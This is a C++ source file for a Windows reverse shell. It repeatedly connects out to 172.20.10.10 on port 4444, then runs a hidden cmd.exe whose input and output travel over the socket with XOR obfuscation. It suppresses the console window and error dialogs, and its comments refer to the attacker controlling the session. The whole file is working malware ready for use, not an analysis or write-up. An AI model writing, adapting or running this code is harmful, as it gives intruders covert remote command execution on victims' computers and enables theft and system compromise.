#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <shlobj.h>
#include <stdio.h>
#include <array>

#pragma comment(lib, "Ws2_32.lib")
#pragma warning(disable: 28251) // Ignore certain warning about HANDLEs in std::array

void xor_buffer(char* buffer, int size, char key = 0x5A) 
{
    for (int i = 0; i < size; ++i)
        buffer[i] ^= key;
}

// This thread reads output from the cmd.exe process and sends it back through the socket
DWORD WINAPI ReadFromCmd(LPVOID lpParam)
{
    auto handles = (std::array<HANDLE, 3>*)lpParam;
    SOCKET sockt = (SOCKET)(*handles)[0];       // The socket connection to the attacker
    HANDLE hStdOutRead = (*handles)[1];         // Read end of the stdout pipe

    char buffer[1024];
    DWORD bytesRead;

    while (true)
    {
        // Check if there's data available in the pipe
        if (PeekNamedPipe(hStdOutRead, NULL, 0, NULL, &bytesRead, NULL) && bytesRead > 0)
        {
            // Read from the pipe
            if (ReadFile(hStdOutRead, buffer, sizeof(buffer), &bytesRead, NULL) && bytesRead > 0)
            {
				// Encrypt with XOR before sending
                xor_buffer(buffer, bytesRead);
                send(sockt, buffer, bytesRead, 0);
            }
        }

        Sleep(10); // Slight delay to avoid 100% CPU usage
    }

    return 0;
}

// This thread receives input from the attacker and writes it into the cmd.exe stdin
DWORD WINAPI WriteToCmd(LPVOID lpParam)
{
    auto handles = (std::array<HANDLE, 3>*)lpParam;
    SOCKET sockt = (SOCKET)(*handles)[0];      // The socket connection to the attacker
    HANDLE hStdInWrite = (*handles)[2];        // Write end of the stdin pipe

    char buffer[1024];
    int recvSize;
    DWORD bytesWritten;

    while (true)
    {
        // Receive data from the socket
        recvSize = recv(sockt, buffer, sizeof(buffer), 0);
        if (recvSize > 0)
        {
			// Encrypt with XOR before writing to stdin
            xor_buffer(buffer, recvSize);
            WriteFile(hStdInWrite, buffer, recvSize, &bytesWritten, NULL);
        }
        else
        {
            break; // If recv fails (connection closed), exit
        }

        Sleep(10);
    }

    ExitProcess(0); // Clean exit if connection dies
    return 0;
}

// Launches a hidden cmd.exe with redirected stdin/stdout connected to a socket
void SpawnShell(SOCKET sockt)
{
    HANDLE hStdInRead = NULL, hStdInWrite = NULL;
    HANDLE hStdOutRead = NULL, hStdOutWrite = NULL;

    // Allow handle inheritance
    SECURITY_ATTRIBUTES sa = { sizeof(SECURITY_ATTRIBUTES), NULL, TRUE };

    // Create pipes for stdin and stdout
    if (!CreatePipe(&hStdOutRead, &hStdOutWrite, &sa, 0) ||
        !CreatePipe(&hStdInRead, &hStdInWrite, &sa, 0))
    {
        return;
    }

    STARTUPINFOW si = { sizeof(si) };
    PROCESS_INFORMATION pi = {};

    // Setup handles for the new process (cmd.exe)
    si.dwFlags = STARTF_USESTDHANDLES;
    si.hStdInput = hStdInRead;
    si.hStdOutput = hStdOutWrite;
    si.hStdError = hStdOutWrite;

    // Launch cmd.exe in a hidden window
    wchar_t cmd[] = L"cmd.exe";
    wchar_t desktopPath[MAX_PATH] = L"C:\\";
    SHGetFolderPathW(NULL, CSIDL_DESKTOPDIRECTORY, NULL, 0, desktopPath);

    if (CreateProcessW(NULL, cmd, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, desktopPath, &si, &pi))
    {
        // We don't need these handles anymore
        CloseHandle(hStdInRead);
        CloseHandle(hStdOutWrite);

        // Bundle all handles into an array for thread usage
        auto threadArgs = new std::array<HANDLE, 3>{ (HANDLE)sockt, hStdOutRead, hStdInWrite };

        // Start reading and writing threads
        HANDLE hReader = CreateThread(NULL, 0, ReadFromCmd, threadArgs, 0, NULL);
        HANDLE hWriter = CreateThread(NULL, 0, WriteToCmd, threadArgs, 0, NULL);

        // Optionally close handles if you don't need to wait on them
        if (hReader) CloseHandle(hReader);
        if (hWriter) CloseHandle(hWriter);

        // Wait until cmd.exe exits (which only happens if user types 'exit')
        WaitForSingleObject(pi.hProcess, INFINITE);

        // Cleanup process/thread handles
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);

        // Clean up memory
        delete threadArgs;
    }

    // Close any remaining handles
    CloseHandle(hStdOutRead);
    CloseHandle(hStdInWrite);
}

// Entry point for the executable (uses WinMain for GUI-less execution)
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
{
    // Disable error dialogs
    SetErrorMode(SEM_FAILCRITICALERRORS | SEM_NOGPFAULTERRORBOX);

    // Prevent console window from showing up
    FreeConsole();

    // Initialize WinSock
    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0)
        return 1;

    // Loop forever until we can connect to the remote server
    while (true)
    {
        // Create TCP socket
        SOCKET sockt = socket(AF_INET, SOCK_STREAM, 0);
        if (sockt == INVALID_SOCKET)
        {
            Sleep(5000); // Wait 5 seconds and retry
            continue;
        }

        // Setup remote address
        sockaddr_in addr = {};
        addr.sin_family = AF_INET;
        addr.sin_port = htons(4444);                        // Target port
        inet_pton(AF_INET, "172.20.10.10", &addr.sin_addr); // Target IP

        // Try to connect
        if (connect(sockt, (sockaddr*)&addr, sizeof(addr)) == 0)
        {
            // Connection succeeded, spawn the shell
            SpawnShell(sockt);
            closesocket(sockt);
        }
        else
        {
            // Connection failed, close socket and retry after 5s
            closesocket(sockt);
            Sleep(5000);
        }
    }

    WSACleanup(); // Never reached in current logic
    return 0;
}
